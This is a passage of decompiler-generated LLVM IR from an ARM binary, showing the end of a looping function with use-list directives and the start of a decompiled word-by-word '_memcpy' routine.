  store i32 ptrtoint (i32* @global_var_2061f.1113 to i32), i32* %r3.global-to-local, align 4
  %v1_1887c = add i32 %v1_18830.pre, 12
  store i32 %v1_1887c, i32* %r5.global-to-local, align 4
  %v1_18880 = inttoptr i32 %v1_18830.pre to i32*
  store i32 160, i32* %v1_18880, align 4
  %v3_18880 = add i32 %v1_18830.pre, 4
  %v4_18880 = inttoptr i32 %v3_18880 to i32*
  %v5_18880 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_18880, i32* %v4_18880, align 4
  %v6_18880 = add i32 %v1_18830.pre, 8
  %v7_18880 = inttoptr i32 %v6_18880 to i32*
  %v8_18880 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_18880, i32* %v7_18880, align 4
  br label %dec_label_pc_188bc

dec_label_pc_18888:                               ; preds = %dec_label_pc_1886c
  %v1_18888 = add i32 %v0_1886c, 16
  %v2_18888 = inttoptr i32 %v1_18888 to i32*
  %v3_18888 = load i32, i32* %v2_18888, align 4
  store i32 %v3_18888, i32* %r3.global-to-local, align 4
  %v1_1888c = add i32 %v3_18888, -48
  %v3_1888c = sub i32 47, %v3_18888
  %v4_1888c = and i32 %v3_1888c, %v3_18888
  %v5_1888c = icmp slt i32 %v4_1888c, 0
  store i1 %v5_1888c, i1* %cpsr_v.global-to-local, align 1
  %v6_1888c = icmp slt i32 %v1_1888c, 0
  store i1 %v6_1888c, i1* %cpsr_n.global-to-local, align 1
  %v7_1888c = icmp eq i32 %v3_18888, 48
  store i1 %v7_1888c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1888c, label %dec_label_pc_1889c, label %bb228

bb228:                                            ; preds = %dec_label_pc_18888
  store i32 %v2_18834, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_188b8

dec_label_pc_1889c:                               ; preds = %dec_label_pc_18888
  %v3_1889c = load i32, i32* %stack_var_-168, align 4
  store i32 %v1_18830.pre, i32* %r5.global-to-local, align 4
  %v2_188a4 = add i32 %v3_1889c, %v2_1884c
  store i32 %v2_188a4, i32* %r3.global-to-local, align 4
  store i32 %v2_188a4, i32* %stack_var_-168, align 4
  br label %dec_label_pc_188bc

dec_label_pc_188b0:                               ; preds = %dec_label_pc_188c4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_188f4

dec_label_pc_188b8:                               ; preds = %bb228, %bb226
  store i32 %v1_18830.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_188bc

dec_label_pc_188bc:                               ; preds = %dec_label_pc_1889c, %dec_label_pc_18878, %dec_label_pc_188b8
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_182b0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_188c4

dec_label_pc_188c4:                               ; preds = %dec_label_pc_188ec, %dec_label_pc_188bc
  %v0_188c4 = phi i32 [ %v1_188e4, %dec_label_pc_188ec ], [ %v2_182b0, %dec_label_pc_188bc ]
  %v1_188c4 = inttoptr i32 %v0_188c4 to i32*
  %v2_188c4 = load i32, i32* %v1_188c4, align 4
  store i32 %v2_188c4, i32* %r1.global-to-local, align 4
  %v3_188c4 = add i32 %v0_188c4, 4
  %v4_188c4 = inttoptr i32 %v3_188c4 to i32*
  %v5_188c4 = load i32, i32* %v4_188c4, align 4
  store i32 %v5_188c4, i32* %r2.global-to-local, align 4
  %v6_188c4 = add i32 %v0_188c4, 8
  %v7_188c4 = inttoptr i32 %v6_188c4 to i32*
  %v8_188c4 = load i32, i32* %v7_188c4, align 4
  store i32 %v8_188c4, i32* %r3.global-to-local, align 4
  %v2_188c8 = load i32, i32* %stack_var_-192, align 4
  store i32 %v2_188c8, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %ip.global-to-local, align 4
  store i32 100568, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_188d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_188d8 = add i32 %v0_188d8, 4
  %v2_188d8 = inttoptr i32 %v1_188d8 to i32*
  %v3_188d8 = load i32, i32* %v2_188d8, align 4
  store i32 %v3_188d8, i32* %r3.global-to-local, align 4
  %v0_188dc = load i32, i32* %r0.global-to-local, align 4
  %v2_188dc = sub i32 %v0_188dc, %v3_188d8
  %v4_188dc = xor i32 %v0_188dc, %v3_188d8
  %v5_188dc = xor i32 %v2_188dc, %v0_188dc
  %v6_188dc = and i32 %v5_188dc, %v4_188dc
  %v7_188dc = icmp slt i32 %v6_188dc, 0
  store i1 %v7_188dc, i1* %cpsr_v.global-to-local, align 1
  %v8_188dc = icmp slt i32 %v2_188dc, 0
  store i1 %v8_188dc, i1* %cpsr_n.global-to-local, align 1
  %v9_188dc = icmp eq i32 %v0_188dc, %v3_188d8
  store i1 %v9_188dc, i1* %cpsr_z.global-to-local, align 1
  %v0_188e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_188e0 = add i32 %v0_188e0, %v0_188dc
  store i32 %v2_188e0, i32* %r6.global-to-local, align 4
  %v1_188e4 = add i32 %v0_188d8, 12
  store i32 %v1_188e4, i32* %r4.global-to-local, align 4
  br i1 %v9_188dc, label %dec_label_pc_188ec, label %dec_label_pc_188b0

dec_label_pc_188ec:                               ; preds = %dec_label_pc_188c4
  %v1_188ec = load i32, i32* %r5.global-to-local, align 4
  %v2_188ec = sub i32 %v1_188e4, %v1_188ec
  %v3_188ec = icmp ult i32 %v1_188e4, %v1_188ec
  %v4_188ec = xor i32 %v1_188ec, %v1_188e4
  %v5_188ec = xor i32 %v2_188ec, %v1_188e4
  %v6_188ec = and i32 %v5_188ec, %v4_188ec
  %v7_188ec = icmp slt i32 %v6_188ec, 0
  store i1 %v7_188ec, i1* %cpsr_v.global-to-local, align 1
  %v8_188ec = icmp slt i32 %v2_188ec, 0
  store i1 %v8_188ec, i1* %cpsr_n.global-to-local, align 1
  %v9_188ec = icmp eq i32 %v1_188e4, %v1_188ec
  store i1 %v9_188ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_188ec, label %dec_label_pc_188c4, label %dec_label_pc_188f4

dec_label_pc_188f4:                               ; preds = %dec_label_pc_188ec, %dec_label_pc_188b0
  %v0_188f4 = phi i32 [ -1, %dec_label_pc_188b0 ], [ %v2_188e0, %dec_label_pc_188ec ]
  store i32 %v0_188f4, i32* %r0.global-to-local, align 4
  %v8_18900 = load i32, i32* %stack_var_-36, align 4
  store i32 %v8_18900, i32* @r6, align 4
  store i32 %v6_1829c, i32* @r7, align 4
  store i32 %v9_1829c, i32* @r8, align 4
  store i32 %v12_1829c, i32* @sb, align 4
  store i32 %v15_1829c, i32* @sl, align 4
  store i32 %v18_1829c, i32* @fp, align 4
  ret i32 %v0_188f4

; uselistorder directives
  uselistorder i32 %v0_188f4, { 1, 0 }
  uselistorder i32 %v2_188ec, { 1, 0 }
  uselistorder i32 %v1_188ec, { 2, 0, 1, 3 }
  uselistorder i32 %v1_188e4, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_188dc, { 1, 0 }
  uselistorder i32 %v0_188dc, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_188d8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_188c4, { 2, 1, 0 }
  uselistorder i32 %v3_18888, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_18834, { 0, 1, 3, 2 }
  uselistorder i32 %v4_18828, { 1, 2, 0 }
  uselistorder i32 %v0_18828, { 1, 0 }
  uselistorder i32 %v1_18830.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_187e8, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_187e4, { 2, 1, 0 }
  uselistorder i32 %storemerge140, { 1, 0 }
  uselistorder i32 %v0_187a8, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1879c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_18778, { 1, 0 }
  uselistorder i32 %v1_18778, { 1, 2, 0, 3 }
  uselistorder i32 %v2_18774, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_1876c, { 1, 0 }
  uselistorder i32 %v0_18764, { 3, 0, 1, 2 }
  uselistorder i32 %v0_1874c, { 1, 0 }
  uselistorder i32 %v1_18728, { 1, 2, 0, 3 }
  uselistorder i32 %v0_18728, { 1, 0, 2 }
  uselistorder i32 %v1_18704, { 0, 2, 1 }
  uselistorder i32 %v0_18700, { 3, 0, 1, 2 }
  uselistorder i1 %v2_186e4, { 2, 1, 0 }
  uselistorder i32 %v2_1863c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_1862c, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v0_186d0, { 3, 0, 4, 7, 5, 6, 9, 1, 2, 8 }
  uselistorder i32 %v0_185d8, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_185c0, { 1, 0 }
  uselistorder i32 %v2_185b8, { 1, 2, 0 }
  uselistorder i32 %v1_185ac, { 1, 0 }
  uselistorder i32 %v0_185ac, { 2, 3, 5, 0, 4, 1 }
  uselistorder i32 %v1_185a4, { 1, 0, 2 }
  uselistorder i32 %v0_1859c, { 3, 0, 1, 2 }
  uselistorder i1 %v3_18580, { 1, 0 }
  uselistorder i32 %v2_18580, { 1, 0 }
  uselistorder i32 %v2_1857c, { 2, 1, 3, 4, 6, 0, 7, 5, 8 }
  uselistorder i1 %v7_18568, { 1, 0 }
  uselistorder i32 %v1_1856c, { 2, 1, 0 }
  uselistorder i1 %v2_1855c, { 1, 0 }
  uselistorder i32 %v0_18558, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_18540, { 1, 0 }
  uselistorder i32 %v1_18534, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v2_184ec, { 1, 2, 0 }
  uselistorder i32 %v2_184e8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_184e8, { 1, 0, 2 }
  uselistorder i1 %v2_184d4, { 1, 0 }
  uselistorder i32 %v0_184cc, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_184dc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_184bc, { 1, 0 }
  uselistorder i32 %v0_184ac, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i1 %v6_184a4, { 1, 0 }
  uselistorder i1 %v5_184a4, { 1, 0 }
  uselistorder i32 %v0_184a0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18494, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_18490, { 0, 1, 3, 5, 2, 4 }
  uselistorder i32 %v4_18444, { 1, 0 }
  uselistorder i32 %v3_18444, { 1, 0 }
  uselistorder i32 %v0_18378, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_182b0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_182ac, { 1, 0 }
  uselistorder i32* %stack_var_-87, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-86, { 1, 2, 0 }
  uselistorder i32* %stack_var_-51, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-50, { 1, 3, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 4, 3, 5, 0, 6, 7, 8, 9 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 6, 2, 3, 7, 4, 8 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 7, 8, 9, 6, 10, 4, 11, 12, 5, 13 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 20, 18, 19, 21, 22, 23, 24, 25, 26, 44, 27, 28, 32, 29, 30, 31, 33, 1, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 53, 45, 46, 2, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 1, 7, 8, 18, 16, 15, 19, 9, 10, 17, 11, 12, 13, 20, 14, 2, 21, 22, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 11, 9, 10, 12 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 24, 25, 26, 27, 28, 1, 29, 30, 31, 32, 33, 0, 34, 35, 36, 37, 38, 39, 40, 51, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i1* %cpsr_v.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 28, 29, 30, 31, 48, 32, 33, 34, 35, 36, 37, 38, 47, 39, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i1* %cpsr_n.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0, 29, 30, 31, 32, 51, 33, 34, 35, 36, 37, 38, 39, 50, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder i32 47, { 2, 3, 0, 1 }
  uselistorder i32 160, { 0, 1, 3, 2 }
  uselistorder i32 112, { 2, 5, 0, 6, 3, 1, 7, 4 }
  uselistorder i32 176, { 1, 4, 2, 5, 0, 6, 3 }
  uselistorder i32 17, { 22, 0, 13, 14, 1, 15, 16, 2, 17, 3, 18, 4, 19, 5, 20, 24, 23, 7, 8, 9, 6, 10, 11, 12, 21 }
  uselistorder i32 102, { 4, 0, 1, 5, 6, 2, 7, 3 }
  uselistorder i32 103, { 1, 2, 3, 4, 0 }
  uselistorder i8 69, { 1, 0 }
  uselistorder i32 96, { 2, 3, 0, 1 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_188bc, { 2, 0, 1 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %dec_label_pc_18824, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1879c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18774, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_1874c, { 1, 0 }
  uselistorder label %dec_label_pc_18728, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1870c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_186e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_186dc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18600, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %dec_label_pc_185f0, { 1, 0 }
  uselistorder label %dec_label_pc_185e4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %bb200, { 1, 0 }
  uselistorder label %.preheader, { 3, 2, 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %dec_label_pc_1850c, { 2, 0, 1 }
  uselistorder label %bb194, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb187, { 1, 0 }
  uselistorder label %.thread105, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %bb180, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_18910 = load i32, i32* @r1, align 4
  %v1_18910 = load i32, i32* %r0.global-to-local, align 4
  %v2_18910 = sub i32 %v0_18910, %v1_18910
  %v3_18910 = icmp ult i32 %v0_18910, %v1_18910
  %v4_18910 = xor i32 %v1_18910, %v0_18910
  %v5_18910 = xor i32 %v2_18910, %v0_18910
  %v6_18910 = and i32 %v5_18910, %v4_18910
  %v7_18910 = icmp slt i32 %v6_18910, 0
  store i1 %v7_18910, i1* %cpsr_v.global-to-local, align 1
  %v8_18910 = icmp slt i32 %v2_18910, 0
  store i1 %v8_18910, i1* %cpsr_n.global-to-local, align 1
  %v9_18910 = icmp eq i32 %v0_18910, %v1_18910
  store i1 %v9_18910, i1* @cpsr_z, align 1
  br i1 %v3_18910, label %dec_label_pc_18b5c, label %dec_label_pc_18918

dec_label_pc_18918:                               ; preds = %entry
  br i1 %v9_18910, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_18918
  %merge = phi i32 [ %v0_18910, %dec_label_pc_18918 ], [ %v2_18bf0, %bb143 ], [ %v11_18c0c, %bb146 ], [ %v7_18c0c, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_18918
  %v5_1891c = inttoptr i32 %v1_18910 to i8*
  store i8* %v5_1891c, i8** %stack_var_-8, align 4
  %v0_18920 = load i32, i32* @r2, align 4
  %v2_18920 = add i32 %v0_18920, -4
  store i32 %v2_18920, i32* %r2.global-to-local, align 4
  %v4_18920 = sub i32 3, %v0_18920
  %v5_18920 = and i32 %v4_18920, %v0_18920
  %v6_18920 = icmp slt i32 %v5_18920, 0
  store i1 %v6_18920, i1* %cpsr_v.global-to-local, align 1
  %v7_18920 = icmp slt i32 %v2_18920, 0
  store i1 %v7_18920, i1* %cpsr_n.global-to-local, align 1
  %v5_18924 = icmp slt i32 %v0_18920, 4
  br i1 %v5_18924, label %bb133, label %dec_label_pc_18928

dec_label_pc_18928:                               ; preds = %bb
  %v1_18928 = urem i32 %v1_18910, 4
  store i32 %v1_18928, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18928 = icmp eq i32 %v1_18928, 0
  br i1 %v2_18928, label %dec_label_pc_18930, label %dec_label_pc_189d4

dec_label_pc_18930:                               ; preds = %dec_label_pc_18928
  %v1_18930 = urem i32 %v0_18910, 4
  store i32 %v1_18930, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18930 = icmp eq i32 %v1_18930, 0
  %extract.t = trunc i32 %v0_18910 to i2
  br i1 %v2_18930, label %dec_label_pc_18938, label %dec_label_pc_18a04

dec_label_pc_18938:                               ; preds = %dec_label_pc_18930, %dec_label_pc_189fc
  %v0_1895093 = phi i32 [ %v1_18910, %dec_label_pc_18930 ], [ %v0_18a4c76, %dec_label_pc_189fc ]
  %v0_1894c92 = phi i32 [ %v0_18910, %dec_label_pc_18930 ], [ %v0_189fc, %dec_label_pc_189fc ]
  %v0_18938 = phi i32 [ %v2_18920, %dec_label_pc_18930 ], [ %v2_189f4, %dec_label_pc_189fc ]
  %v2_18938 = add i32 %v0_18938, -8
  store i32 %v2_18938, i32* %r2.global-to-local, align 4
  %v4_18938 = sub i32 7, %v0_18938
  %v5_18938 = and i32 %v4_18938, %v0_18938
  %v6_18938 = icmp slt i32 %v5_18938, 0
  store i1 %v6_18938, i1* %cpsr_v.global-to-local, align 1
  %v7_18938 = icmp slt i32 %v2_18938, 0
  store i1 %v7_18938, i1* %cpsr_n.global-to-local, align 1
  %v5_1893c = icmp slt i32 %v0_18938, 8
  br i1 %v5_1893c, label %dec_label_pc_1898c, label %dec_label_pc_18940

dec_label_pc_18940:                               ; preds = %dec_label_pc_18938
  %v2_18940 = add i32 %v0_18938, -28
  store i32 %v2_18940, i32* %r2.global-to-local, align 4
  %v4_18940 = sub i32 27, %v0_18938
  %v5_18940 = and i32 %v4_18940, %v2_18938
  %v6_18940 = icmp slt i32 %v5_18940, 0
  store i1 %v6_18940, i1* %cpsr_v.global-to-local, align 1
  %v7_18940 = icmp slt i32 %v2_18940, 0
  store i1 %v7_18940, i1* %cpsr_n.global-to-local, align 1
  %v5_18944 = icmp slt i32 %v2_18938, 20
  br i1 %v5_18944, label %dec_label_pc_18978, label %dec_label_pc_18948

dec_label_pc_18948:                               ; preds = %dec_label_pc_18940
  %v0_18948 = load i32, i32* @r4, align 4
  store i32 %v0_18948, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1894c

dec_label_pc_1894c:                               ; preds = %dec_label_pc_1894c.dec_label_pc_1894c_crit_edge, %dec_label_pc_18948
  %v0_18950 = phi i32 [ %v12_18958, %dec_label_pc_1894c.dec_label_pc_1894c_crit_edge ], [ %v0_1895093, %dec_label_pc_18948 ]
  %v0_1894c = phi i32 [ %v0_1894c.pre, %dec_label_pc_1894c.dec_label_pc_1894c_crit_edge ], [ %v0_1894c92, %dec_label_pc_18948 ]
  %v1_1894c = inttoptr i32 %v0_1894c to i32*
  %v2_1894c = load i32, i32* %v1_1894c, align 4
  store i32 %v2_1894c, i32* %r3.global-to-local, align 4
  %v3_1894c = add i32 %v0_1894c, 4
  %v4_1894c = inttoptr i32 %v3_1894c to i32*
  %v5_1894c = load i32, i32* %v4_1894c, align 4
  store i32 %v5_1894c, i32* %r4.global-to-local, align 4
  %v6_1894c = add i32 %v0_1894c, 8
  %v7_1894c = inttoptr i32 %v6_1894c to i32*
  %v8_1894c = load i32, i32* %v7_1894c, align 4
  store i32 %v8_1894c, i32* %ip.global-to-local, align 4
  %v9_1894c = add i32 %v0_1894c, 12
  %v10_1894c = inttoptr i32 %v9_1894c to i32*
  %v11_1894c = load i32, i32* %v10_1894c, align 4
  store i32 %v11_1894c, i32* %lr.global-to-local, align 4
  %v12_1894c = add i32 %v0_1894c, 16
  store i32 %v12_1894c, i32* %r1.global-to-local, align 4
  %v1_18950 = inttoptr i32 %v0_18950 to i32*
  store i32 %v2_1894c, i32* %v1_18950, align 4
  %v3_18950 = add i32 %v0_18950, 4
  %v4_18950 = inttoptr i32 %v3_18950 to i32*
  %v5_18950 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18950, i32* %v4_18950, align 4
  %v6_18950 = add i32 %v0_18950, 8
  %v7_18950 = inttoptr i32 %v6_18950 to i32*
  %v8_18950 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_18950, i32* %v7_18950, align 4
  %v9_18950 = add i32 %v0_18950, 12
  %v10_18950 = inttoptr i32 %v9_18950 to i32*
  %v11_18950 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_18950, i32* %v10_18950, align 4
  %v12_18950 = add i32 %v0_18950, 16
  store i32 %v12_18950, i32* %r0.global-to-local, align 4
  %v0_18954 = load i32, i32* %r1.global-to-local, align 4
  %v1_18954 = inttoptr i32 %v0_18954 to i32*
  %v2_18954 = load i32, i32* %v1_18954, align 4
  store i32 %v2_18954, i32* %r3.global-to-local, align 4
  %v3_18954 = add i32 %v0_18954, 4
  %v4_18954 = inttoptr i32 %v3_18954 to i32*
  %v5_18954 = load i32, i32* %v4_18954, align 4
  store i32 %v5_18954, i32* %r4.global-to-local, align 4
  %v6_18954 = add i32 %v0_18954, 8
  %v7_18954 = inttoptr i32 %v6_18954 to i32*
  %v8_18954 = load i32, i32* %v7_18954, align 4
  store i32 %v8_18954, i32* @ip, align 4
  %v9_18954 = add i32 %v0_18954, 12
  %v10_18954 = inttoptr i32 %v9_18954 to i32*
  %v11_18954 = load i32, i32* %v10_18954, align 4
  store i32 %v11_18954, i32* @lr, align 4
  %v12_18954 = add i32 %v0_18954, 16
  store i32 %v12_18954, i32* @r1, align 4
  %v1_18958 = inttoptr i32 %v12_18950 to i32*
  store i32 %v2_18954, i32* %v1_18958, align 4
  %v3_18958 = add i32 %v0_18950, 20
  %v4_18958 = inttoptr i32 %v3_18958 to i32*
  %v5_18958 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18958, i32* %v4_18958, align 4
  %v6_18958 = add i32 %v0_18950, 24
  %v7_18958 = inttoptr i32 %v6_18958 to i32*
  %v8_18958 = load i32, i32* @ip, align 4
  store i32 %v8_18958, i32* %v7_18958, align 4
  %v9_18958 = add i32 %v0_18950, 28
  %v10_18958 = inttoptr i32 %v9_18958 to i32*
  %v11_18958 = load i32, i32* @lr, align 4
  store i32 %v11_18958, i32* %v10_18958, align 4
  %v12_18958 = add i32 %v0_18950, 32
  store i32 %v12_18958, i32* %r0.global-to-local, align 4
  %v0_1895c = load i32, i32* %r2.global-to-local, align 4
  %v2_1895c = add i32 %v0_1895c, -32
  store i32 %v2_1895c, i32* %r2.global-to-local, align 4
  %v6_18960 = icmp slt i32 %v0_1895c, 32
  br i1 %v6_18960, label %dec_label_pc_18964, label %dec_label_pc_1894c.dec_label_pc_1894c_crit_edge

dec_label_pc_1894c.dec_label_pc_1894c_crit_edge:  ; preds = %dec_label_pc_1894c
  %v0_1894c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1894c

dec_label_pc_18964:                               ; preds = %dec_label_pc_1894c
  %v4_18964 = add i32 %v0_1895c, -16
  %v6_18964 = add i32 %v0_1895c, 2147483616
  %v7_18964 = and i32 %v4_18964, %v6_18964
  %v8_18964 = icmp slt i32 %v7_18964, 0
  store i1 %v8_18964, i1* %cpsr_v.global-to-local, align 1
  %v9_18964 = icmp slt i32 %v4_18964, 0
  store i1 %v9_18964, i1* %cpsr_n.global-to-local, align 1
  %v5_18968 = icmp slt i32 %v2_1895c, -16
  br i1 %v5_18968, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_18964
  %v6_18968 = load i32, i32* @r1, align 4
  %v7_18968 = inttoptr i32 %v6_18968 to i32*
  %v8_18968 = load i32, i32* %v7_18968, align 4
  store i32 %v8_18968, i32* %r3.global-to-local, align 4
  %v9_18968 = add i32 %v6_18968, 4
  %v10_18968 = inttoptr i32 %v9_18968 to i32*
  %v11_18968 = load i32, i32* %v10_18968, align 4
  store i32 %v11_18968, i32* %r4.global-to-local, align 4
  %v12_18968 = add i32 %v6_18968, 8
  %v13_18968 = inttoptr i32 %v12_18968 to i32*
  %v14_18968 = load i32, i32* %v13_18968, align 4
  store i32 %v14_18968, i32* @ip, align 4
  %v15_18968 = add i32 %v6_18968, 12
  %v16_18968 = inttoptr i32 %v15_18968 to i32*
  %v17_18968 = load i32, i32* %v16_18968, align 4
  store i32 %v17_18968, i32* @lr, align 4
  %v18_18968 = add i32 %v6_18968, 16
  store i32 %v18_18968, i32* @r1, align 4
  %v7_1896c = inttoptr i32 %v12_18958 to i32*
  store i32 %v8_18968, i32* %v7_1896c, align 4
  %v9_1896c = add i32 %v0_18950, 36
  %v10_1896c = inttoptr i32 %v9_1896c to i32*
  %v11_1896c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_1896c, i32* %v10_1896c, align 4
  %v12_1896c = add i32 %v0_18950, 40
  %v13_1896c = inttoptr i32 %v12_1896c to i32*
  %v14_1896c = load i32, i32* @ip, align 4
  store i32 %v14_1896c, i32* %v13_1896c, align 4
  %v15_1896c = add i32 %v0_18950, 44
  %v16_1896c = inttoptr i32 %v15_1896c to i32*
  %v17_1896c = load i32, i32* @lr, align 4
  store i32 %v17_1896c, i32* %v16_1896c, align 4
  %v18_1896c = add i32 %v0_18950, 48
  store i32 %v18_1896c, i32* %r0.global-to-local, align 4
  %v6_18970 = load i32, i32* %r2.global-to-local, align 4
  %v7_18970 = add i32 %v6_18970, -16
  store i32 %v7_18970, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18964, %bb130
  %v3_18980102 = phi i32 [ %v12_18958, %dec_label_pc_18964 ], [ %v18_1896c, %bb130 ]
  %v0_1897896 = phi i32 [ %v2_1895c, %dec_label_pc_18964 ], [ %v7_18970, %bb130 ]
  %v2_18974 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18974, i32* @r4, align 4
  br label %dec_label_pc_18978

dec_label_pc_18978:                               ; preds = %dec_label_pc_18940, %.thread2
  %v3_18980101 = phi i32 [ %v0_1895093, %dec_label_pc_18940 ], [ %v3_18980102, %.thread2 ]
  %v0_18978 = phi i32 [ %v2_18940, %dec_label_pc_18940 ], [ %v0_1897896, %.thread2 ]
  %v1_18978 = add i32 %v0_18978, 20
  store i32 %v1_18978, i32* %r2.global-to-local, align 4
  %v3_18978 = sub i32 0, %v0_18978
